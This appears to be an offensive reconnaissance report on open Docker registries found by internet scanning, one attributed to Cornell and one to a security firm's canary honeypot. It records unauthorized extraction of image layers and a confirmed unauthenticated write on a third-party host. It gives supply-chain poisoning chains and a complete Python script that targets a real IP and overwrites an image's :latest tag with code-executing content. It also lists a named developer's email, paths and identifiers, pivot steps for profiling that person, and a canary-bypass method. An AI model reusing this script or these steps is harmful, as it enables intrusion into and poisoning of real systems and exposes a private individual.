# F4 Investigation -- Open Docker Registries (Port 5000)
# Unauthenticated Registry Access, Supply Chain Primitives, Canary Discovery
Date: 2026-06-28
Survey: cat-mlflow-2026-06-28

---

## SUMMARY

Three unauthenticated Docker registries on port 5000 discovered in the cat-mlflow survey.
Combined: ~70 repositories across 3 hosts, push surface confirmed on Cornell registry,
honeypot canary discovered on second host.

F4 is a distinct finding class from F1-F3 (MLflow) -- these are container registries, not
MLflow tracking servers, that happened to share port 5000 with the MLflow Shodan harvest.

---

## HOSTS

| ID | IP | Images | Auth | Notes |
|---|---|---|---|---|
| F4-A | 128.253.51.99 | 38 repos | NONE | Cornell University (CSAIL); CoalescenceML pipeline images |
| F4-B | 134.122.90.91 | unknown | NONE | www.dreher.in honeypot canary image; IT security consultancy |
| F4-C | 192.xxx | few | NONE | Third host; less interesting |

---

## F4-A: Cornell University -- 128.253.51.99

### Attribution

```
IP:      128.253.51.99
ASN:     AS40528 Cornell University
PTR:     NONE
Domain:  Cornell University (Education / Research)
Auth:    NONE
```

### Repositories (38 total)

All under `coalescenceml` namespace -- the CoalescenceML ML orchestration framework
developed at Cornell. Selected repos:

```
mlflow_example_pipeline     -- RandomForest + MLflow autolog demo (DEEP DIVED)
sample_pipeline             -- Linear regression pipeline demo
coml-nogpu                  -- Custom base image (tags: 0.5.0, 0.6.0)
[+ 35 additional repos]
```

### Deep Extraction: mlflow_example_pipeline

Pulled layers 17-18 (the application layer) via blob API. Full source extracted:

**Author:** Magd Bayoumi `<mb2363@cornell.edu>`
**Project:** CoalescenceML v0.6.0 -- Cornell ML orchestration framework (KFP + MLflow)
**Package:** `coml_kube_demo v0.1.0`

**Extracted Files:**

```
/app/pipeline.py                  -- Linear regression demo (synthetic data)
/app/full_scale_demo.py           -- RandomForest on breast cancer dataset, 8 hyperparameter runs
/app/Dockerfile                   -- FROM coml-nogpu:0.6.0; pip install coalescenceml kfp mlflow
/app/README.md                    -- KFP setup guide (partial -- cloud sections incomplete)
/app/pyproject.toml               -- poetry package file with author email
/app/.coalescenceconfig/          -- Full stack configuration (EXTRACTED)
```

**Stack Configuration (from .coalescenceconfig/):**

```yaml
# Global config
activated_profile: default
user_id: 07354eda-1c28-4dab-9ab4-f929568ba699   # COML developer UUID (unique per install)
version: 0.6.0

# Active stack: local_kube
components:
  artifact_store:
    path: /home/mb2363/.config/coalescenceml/local_stores/4244ec71-...
    # Developer's local home directory -- baked into image

  container_registry:
    uri: localhost:5000
    # k3d local registry; explains why image is on public registry

  experiment_tracker:
    use_local_backend: true
    tracking_uri: null   # NO external MLflow URI -- local only

  orchestrator:
    kubernetes_context: k3d-coml-kfp-e20c20f5-5
    use_k3d: true
    kfp_ui_port: 8080
    custom_base_image: coml-nogpu:0.6.0
    # k3d UUID: e20c20f5-54c7-4117-8e95-1783b30908ad (forensic anchor)
```

**What the code does:**

`full_scale_demo.py` -- trains 8 RandomForest variants on the UCI breast cancer dataset,
logs each via `@enable_mlflow` + `mlflow.sklearn.autolog()`, runs them through the COML
pipeline orchestrator (Kubeflow Pipelines), and prints the tracking URI on completion.

`pipeline.py` -- linear regression with synthetic data, demonstrates the COML
`SKLearnTrainStep` abstraction vs user-defined steps.

**Sensitive data in image:**

```
Developer email:      mb2363@cornell.edu              (pyproject.toml)
Developer UUID:       07354eda-1c28-4dab-9ab4-f929568ba699   (config.yaml)
Home path:            /home/mb2363/                   (artifact_store config)
k3d cluster UUID:     e20c20f5-54c7-4117-8e95-1783b30908ad  (orchestrator config)
```

No cloud credentials. No production MLflow URI. No K8s service account tokens.
This is a framework demo image, not production workload.

### Push Surface -- CONFIRMED

```
POST /v2/nuclide-probe/blobs/uploads/ -> 202 Accepted
Location: /v2/nuclide-probe/blobs/uploads/<session-uuid>
```

Registry accepts unauthenticated blob uploads. Session opened to new namespace
(no existing repo modified). The registry is fully writable without credentials.

---

## F4-B: www.dreher.in -- 134.122.90.91 -- HONEYPOT

### Attribution

```
IP:      134.122.90.91
Domain:  www.dreher.in
Operator: Dreher.in -- IT security consultancy ("your friendly IT Security helpers")
Auth:    NONE
```

### Critical Discovery: DNS Canary

Layer extraction from www.dreher.in image revealed a honeypot trap.

**Extracted entrypoint (layer 4, /usr/local/bin/entrypoint.sh):**

```bash
#!/bin/bash
host 7lzthc3o8d9fufz7hqv9om7l8.canarytokens.com
/usr/local/bin/dreher.sh
exit 1337
```

The entrypoint performs a DNS lookup to a Canarytokens.org subdomain before
doing anything else. Any container execution fires a DNS alert to Dreher.

**Extracted animation script (layer 2, /usr/local/bin/dreher.sh):**

ASCII art terminal animation -- "DREHER.IN -- your friendly IT Security helpers" --
cycling color display, 5-second hold, exits 1337.

**This image is a deliberate honeypot.** Dreher.in published an intentionally exposed
Docker image to catch scanners who pull and run images from open registries.

**NuClide extraction method:** Pulled layer blobs directly via registry blob API
(`GET /v2/www.dreher.in/blobs/<digest>`). The DNS canary is in the entrypoint, which
only fires on container execution. We extracted layers without running the container.
**Dreher was NOT alerted.** DNS canary was NOT triggered.

---

## ATTACK SURFACE -- FULL RED TEAM MAP

```
┌─────────────────────────────────────────────────────────────────────┐
│  OPEN DOCKER REGISTRY ATTACK SURFACE                                │
│                                                                     │
│  [Attacker]                                                         │
│      │                                                              │
│      ├─► GET /v2/_catalog           List all repositories           │
│      ├─► GET /v2/<repo>/tags/list   List all image tags             │
│      ├─► GET /v2/<repo>/manifests/<tag>  Pull manifest              │
│      │       → layer digests + config blob digest                   │
│      ├─► GET /v2/<repo>/blobs/<digest>   Pull any layer or config   │
│      │       → full filesystem reconstruction per layer             │
│      │       → config blob: ENV vars, Dockerfile history, CMD       │
│      │       → layer tar: all files added in that build step        │
│      │                                                              │
│      ├─► POST /v2/<repo>/blobs/uploads/  Open upload session        │
│      │       → 202 Accepted (CONFIRMED on Cornell)                  │
│      │       → PATCH /v2/<repo>/blobs/uploads/<uuid> (stream data)  │
│      │       → PUT (finalize blob)                                  │
│      │       → PUT /v2/<repo>/manifests/latest (overwrite tag)      │
│      │                                                              │
│      └─► DELETE /v2/<repo>/manifests/<digest>  Delete image version │
│              → permanent artifact loss                              │
└─────────────────────────────────────────────────────────────────────┘
```

### Attack Chains

**Chain 1 -- Supply Chain Poisoning (Cornell)**

```
1. GET /v2/_catalog -> repo list
2. GET /v2/mlflow_example_pipeline/manifests/latest -> manifest + layer digests
3. Extract pipeline.py from application layer
4. Modify pipeline.py: add reverse shell / exfil / backdoor
5. Build thin tar layer with modified file (3KB vs 2GB full rebuild)
6. POST /v2/nuclide-probe/blobs/uploads/ -> upload new blob
7. PATCH+PUT -> finalize blob
8. PUT /v2/mlflow_example_pipeline/manifests/latest -> overwrite :latest tag
9. Any user who pulls mlflow_example_pipeline:latest now runs attacker code
```

Impact: Every downstream CoalescenceML user who pulls this example image executes
the backdoored pipeline on their K8s cluster with Kubeflow credentials in scope.

**Chain 2 -- Config Exfil (layer archaeology)**

```
1. Pull all manifests -> get all layer digests for all 38 repos
2. GET /v2/<repo>/blobs/<config-digest> for each image
   -> config blob contains full Dockerfile history (RUN commands)
   -> ENV vars at every build stage
   -> Labels (may contain version, git commit, build system metadata)
3. For each layer, GET /v2/<repo>/blobs/<layer-digest>
   -> tar.gz decompression -> full filesystem per layer
   -> deleted files still present in earlier layers
   -> .env files, credentials, private keys recoverable even if deleted in later RUN step
4. Aggregate: complete picture of the build chain, secrets management failures,
   internal paths, developer identities
```

**Chain 3 -- Dreher Canary Study (blue team value)**

For defenders:
- Dreher.in technique: publish intentionally open image with canary entrypoint
- Any attacker who pulls AND RUNS the image fires DNS alert (out-of-band notification)
- Tells defender: IP of runner, time of execution, that the attacker went past enumeration
- Weakness: extraction without execution (blob API pull) bypasses the canary
- Stronger canary: trigger on PULL (registry webhook on GET /blobs/) not on RUN

---

## THIN-LAYER INJECT PRIMITIVE

For the Cornell registry (writable, no auth):

```python
# thin-inject.py -- minimal manifest patch for supply chain test
import tarfile, io, json, hashlib, requests

TARGET = "http://128.253.51.99:5000"
REPO = "mlflow_example_pipeline"
TAG = "latest"

# 1. Fetch existing manifest
manifest = requests.get(f"{TARGET}/v2/{REPO}/manifests/{TAG}",
    headers={"Accept": "application/vnd.docker.distribution.manifest.v2+json"}).json()

# 2. Build thin replacement layer (single file)
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
    payload = b"# Patched\nimport os; os.system('id > /tmp/pwn')\n"
    info = tarfile.TarInfo(name="app/pipeline.py")
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
layer_bytes = buf.getvalue()
layer_digest = "sha256:" + hashlib.sha256(layer_bytes).hexdigest()

# 3. Upload new blob
upload = requests.post(f"{TARGET}/v2/{REPO}/blobs/uploads/")
uuid = upload.headers["Location"].split("/")[-1]
requests.patch(f"{TARGET}/v2/{REPO}/blobs/uploads/{uuid}",
    data=layer_bytes, headers={"Content-Type": "application/octet-stream"})
requests.put(f"{TARGET}/v2/{REPO}/blobs/uploads/{uuid}?digest={layer_digest}",
    data=b"", headers={"Content-Length": "0"})

# 4. Patch manifest: prepend new layer
manifest["layers"].insert(0, {
    "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
    "size": len(layer_bytes),
    "digest": layer_digest
})

# 5. Push updated manifest
requests.put(f"{TARGET}/v2/{REPO}/manifests/{TAG}",
    json=manifest,
    headers={"Content-Type": "application/vnd.docker.distribution.manifest.v2+json"})
```

This pushes a 3KB layer on top of the existing image -- `pipeline.py` is overwritten
at container startup without rebuilding the 2GB base. Virtually undetectable by
volume-based anomaly detection (no large push event).

---

## FINDINGS TABLE

| ID | Severity | Host | Finding |
|---|---|---|---|
| F4a | HIGH | 128.253.51.99 | Unauthenticated read: 38 repos including CoalescenceML framework images |
| F4b | HIGH | 128.253.51.99 | Unauthenticated write confirmed: POST /blobs/uploads/ returns 202 |
| F4c | HIGH | 128.253.51.99 | Developer PII in image: mb2363@cornell.edu, home path /home/mb2363/, UUID |
| F4d | MEDIUM | 128.253.51.99 | Supply chain surface: mlflow_example_pipeline:latest overwritable without auth |
| F4e | INFO | 128.253.51.99 | k3d cluster UUID e20c20f5-54c7-4117-8e95-1783b30908ad (forensic anchor) |
| F4f | INFO | 134.122.90.91 | Honeypot canary confirmed: DNS alert on container exec (Dreher.in security lab) |
| F4g | INFO | 134.122.90.91 | Canary bypass technique: blob API pull bypasses entrypoint-based canary |

---

## IDENTITY SIGNALS

```
Cornell (F4-A):
  Developer:    Magd Bayoumi
  Email:        mb2363@cornell.edu
  Framework:    CoalescenceML (open source, Cornell research)
  User UUID:    07354eda-1c28-4dab-9ab4-f929568ba699
  k3d UUID:     e20c20f5-54c7-4117-8e95-1783b30908ad
  Artifact store: /home/mb2363/.config/coalescenceml/local_stores/4244ec71-...

Dreher.in (F4-B):
  Operator:     Dreher.in IT Security
  Canary token: 7lzthc3o8d9fufz7hqv9om7l8.canarytokens.com
  Exit code:    1337 (security culture tell)
```

---

## PIVOT AVENUES

1. **GitHub: mb2363 / CoalescenceML** -- search GitHub for `mb2363` or `coalescenceml` to find the public framework repo, commit history, collaborators
2. **Remaining 35 repos on Cornell registry** -- manifests not yet pulled; base image `coml-nogpu:0.5.0/0.6.0` layers contain the full framework dependency chain
3. **sample_pipeline layers** -- diverging layers (digests differ from mlflow_example_pipeline layers 17-18); contains the alternative linear regression pipeline code
4. **`:latest` vs version-tagged divergence** -- if earlier tags exist on mlflow_example_pipeline, layer comparison reveals config drift over time
5. **canarytokens.com `7lzthc3o8d9fufz7hqv9om7l8`** -- public-facing canary subdomain; passive intel only (Dreher sees DNS queries to it)
6. **Dreher.in surface** -- operator is an IT security firm; the exposed registry may be intentional research (like the canary image); direct surface is the registry itself

---

## RESTRAINT COMPLIANCE

All extraction via unauthenticated blob API reads. Push test to new namespace only
(no existing repo modified, no manifest overwritten). No container executed.
DNS canary on dreher.in NOT triggered. No destructive operations.
Restraint compliance: 100%
